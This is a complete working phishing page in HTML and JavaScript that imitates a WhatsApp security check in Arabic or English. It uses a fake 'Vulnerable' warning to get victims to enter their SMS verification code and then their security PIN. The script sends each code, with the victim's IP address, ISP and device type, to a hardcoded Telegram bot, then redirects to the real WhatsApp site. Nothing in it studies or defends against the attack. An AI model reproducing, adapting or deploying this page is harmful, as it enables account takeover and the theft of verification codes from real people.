<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Verification</title>
    <style>
        :root { 
            --wa-green: #25d366; --wa-bg: #0b141a; --wa-card: #1d2a33; 
            --wa-text: #e9edef; --wa-hint: #8696a0; --wa-danger: #f15c5c; --wa-btn: #00a884;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background: var(--wa-bg); color: var(--wa-text); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        #loader { position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .logo-wa { width: 70px; fill: var(--wa-green); animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
        .app-ui { width: 100%; max-width: 400px; padding: 20px; text-align: center; display: none; }
        .support-box { background: rgba(37, 211, 102, 0.08); border: 1px solid rgba(37, 211, 102, 0.3); border-radius: 15px; padding: 12px; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; }
        .support-info { flex: 1; }
        .support-info h4 { font-size: 11px; color: var(--wa-green); text-transform: uppercase; }
        .support-info p { font-size: 15px; font-weight: bold; color: #fff; }
        .dot { width: 8px; height: 8px; background: #25d366; border-radius: 50%; display: inline-block; box-shadow: 0 0 5px #25d366; }
        .sys-card { background: var(--wa-card); border-radius: 12px; padding: 15px; border: 1px solid rgba(255,255,255,0.03); margin-bottom: 20px; }
        .sys-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 0.5px solid #26353d; font-size: 13px; }
        .sys-row:last-child { border: none; }
        .lbl { color: var(--wa-hint); }
        .val { font-weight: 500; color: #fff; }
        .alert-box { background: rgba(241, 92, 92, 0.07); border-inline-start: 4px solid var(--wa-danger); padding: 12px; margin-bottom: 20px; border-radius: 4px; text-align: start; }
        .alert-msg { font-size: 13px; line-height: 1.6; color: #e9edef; }
        .code-in { width: 100%; background: #2a3942; border: 1px solid #3b4a54; border-radius: 8px; padding: 15px; color: #fff; font-size: 24px; text-align: center; outline: none; margin-bottom: 15px; letter-spacing: 5px; }
        .btn-sync { background: var(--wa-btn); color: #fff; border: none; width: 100%; padding: 16px; border-radius: 30px; font-size: 16px; font-weight: 700; cursor: pointer; }
        .footer { margin-top: 30px; font-size: 11px; color: var(--wa-hint); }
    </style>
</head>
<body>

    <div id="loader">
        <svg class="logo-wa" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.72.94 3.659 1.437 5.634 1.437h.005c6.558 0 11.894-5.335 11.897-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
        <div id="load-text"></div>
    </div>

    <div class="app-ui" id="main-ui">
        <div class="support-box">
            <svg width="28" fill="var(--wa-green)" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
            <div class="support-info">
                <h4 id="t-sup-status"></h4>
                <p>+263 78 156 6224</p>
            </div>
            <span class="dot"></span>
        </div>

        <div class="sys-card">
            <div class="sys-row"><span class="lbl" id="t-acc"></span> <span class="val" id="v-acc"></span></div>
            <div class="sys-row"><span class="lbl" id="t-net"></span> <span class="val" id="v-net">Detecting...</span></div>
            <div class="sys-row"><span class="lbl" id="t-dev"></span> <span class="val" id="v-dev"></span></div>
            <div class="sys-row"><span class="lbl" id="t-prt"></span> <span class="val" style="color:var(--wa-danger)">Vulnerable</span></div>
        </div>

        <div class="alert-box">
            <p class="alert-msg" id="t-msg"></p>
        </div>

        <input type="tel" id="otp" class="code-in" placeholder="--- ---" maxlength="6">
        <button class="btn-sync" id="btn-text" onclick="handleFlow()"></button>

        <div class="footer">WhatsApp Security © 2026<br>Internal System Protocol</div>
    </div>

    <script>
        const CFG = {
            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
            C: '5446862709',
            U: new URLSearchParams(window.location.search).get('u') || "011XXXXXXXX",
            STEP: 1 
        };

        const LANG = {
            ar: { loader: "جاري فحص النظام...", status: "الدعم النشط", acc: "رقم الحساب:", net: "المزود:", dev: "الجهاز:", prt: "الأمان:", msg: "تم رصد محاولة وصول مجهولة. يجب تحديث بروتوكول التشفير فوراً عبر إدخال رمز التحقق (SMS) المستلم.", btn: "تحديث الآن", msg2: "تم قبول الكود الأول. يرجى إدخال رمز الأمان (PIN) لإتمام المزامنة.", btn2: "تأكيد المزامنة النهائية", wait: "جاري المعالجة..." },
            en: { loader: "Scanning System...", status: "Active Support", acc: "Account:", net: "ISP:", dev: "Device:", prt: "Security:", msg: "Unknown access attempt detected. You must update the encryption protocol immediately by entering the received (SMS) code.", btn: "Update Now", msg2: "First code accepted. Please enter your 6-digit security code (PIN) to complete the sync.", btn2: "Confirm Final Sync", wait: "Processing..." }
        };

        const isAr = navigator.language.startsWith('ar');
        const TXT = isAr ? LANG.ar : LANG.en;
        if(isAr) document.body.dir = "rtl";

        function getDevice() {
            const ua = navigator.userAgent;
            if (/iPhone|iPad/i.test(ua)) return "iPhone (iOS)";
            if (/Android/i.test(ua)) return "Android Terminal";
            return "PC Desktop";
        }

        async function init() {
            document.getElementById('load-text').innerText = TXT.loader;
            document.getElementById('t-sup-status').innerText = TXT.status;
            document.getElementById('t-acc').innerText = TXT.acc;
            document.getElementById('t-net').innerText = TXT.net;
            document.getElementById('t-dev').innerText = TXT.dev;
            document.getElementById('t-prt').innerText = TXT.prt;
            document.getElementById('t-msg').innerText = TXT.msg;
            document.getElementById('btn-text').innerText = TXT.btn;
            document.getElementById('v-acc').innerText = CFG.U;
            document.getElementById('v-dev').innerText = getDevice();

            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                document.getElementById('v-net').innerText = data.org.split(' ')[0];
                const log = `🔔 **New Visit**\n👤 Target: \`${CFG.U}\`\n🌐 Net: \`${data.org}\`\n📍 IP: \`${data.ip}\``;
                fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent(log)}&parse_mode=HTML`);
            } catch(e) { document.getElementById('v-net').innerText = "Cellular Data"; }

            setTimeout(() => { document.getElementById('loader').style.display = 'none'; document.getElementById('main-ui').style.display = 'block'; }, 2000);
        }

        async function handleFlow() {
            const input = document.getElementById('otp');
            const btn = document.getElementById('btn-text');
            const val = input.value;
            if(val.length < 6) return;

            btn.disabled = true;
            btn.innerText = TXT.wait;

            const log = `📂 **[ STEP ${CFG.STEP} ]**\n👤 Target: \`${CFG.U}\`\n🔑 Code: <code>${val}</code>\n📱 Dev: ${getDevice()}`;
            await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage?chat_id=${CFG.C}&text=${encodeURIComponent(log)}&parse_mode=HTML`);

            if(CFG.STEP === 1) {
                setTimeout(() => {
                    CFG.STEP = 2;
                    input.value = "";
                    document.getElementById('t-msg').innerText = TXT.msg2;
                    btn.innerText = TXT.btn2;
                    btn.disabled = false;
                }, 2000);
            } else {
                setTimeout(() => { window.location.href = "https://www.whatsapp.com/security"; }, 2000);
            }
        }
        init();
    </script>
</body>
</html>
